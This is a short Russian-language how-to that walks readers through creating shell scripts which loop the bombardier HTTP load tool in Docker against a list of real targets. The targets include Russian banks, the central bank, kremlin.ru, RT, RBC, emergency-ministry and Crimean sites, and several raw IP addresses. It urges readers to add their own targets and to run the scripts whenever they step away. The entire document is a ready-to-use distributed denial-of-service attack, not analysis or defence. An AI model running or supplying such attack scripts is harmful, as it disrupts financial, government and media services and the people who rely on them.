1. vim run.sh
1. вставляем текст:
   ```
   #!/bin/sh
   screen -d -m -S "$2" bash -c "for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l $1 && sleep 5; done"
   ```
1. chmod 777 run.sh
1. vim bombard.sh
1. вставляем текст:
   ```
   #!/bin/sh
   ./run.sh https://www.sberbank.ru sb
   ./run.sh https://www.sberbank.ru sb
   ./run.sh https://stories-stat.online.sberbank.ru ssoc
   ./run.sh https://clickstream.online.sberbank.ru cos
   ./run.sh https://stat.online.sberbank.ru sos
   ./run.sh http://cbr.ru/ cr
   ./run.sh https://admin.gazprombank.ru/ ag
   ./run.sh https://www.rbc.ru/ rbc
   ./run.sh http://185.72.229.13 rbc1
   ./run.sh http://80.68.253.13 rbc2
   ./run.sh http://80.68.253.3 rbc3
   ./run.sh http://185.72.229.3 rbc4
   ./run.sh https://www.rt.com rt
   ./run.sh http://185.79.236.172 rt1
   ./run.sh http://89.191.237.172 rt2
   ./run.sh http://kremlin.ru kr
   ./run.sh https://www.mchs.gov.ru mchs
   ./run.sh https://krym-webcams.ru kw
   ./run.sh http://crimea-media.ru cm
   ./run.sh https://onliner.by ob
   ./run.sh https://tinkoff.ru ti
   ./run.sh https://sevstar.net se
   ./run.sh https://bitzlato.com bi
   ./run.sh https://shop-rt.com sh
   ```
   здесь можно импровизировать ;)
1. chmod 777 bombard.sh
1. ./bombard.sh
1. Запускаем `htop`, радуемся картинке

Теперь каджый раз, когда вы отходите от компа просто запустите `./bombard.sh`
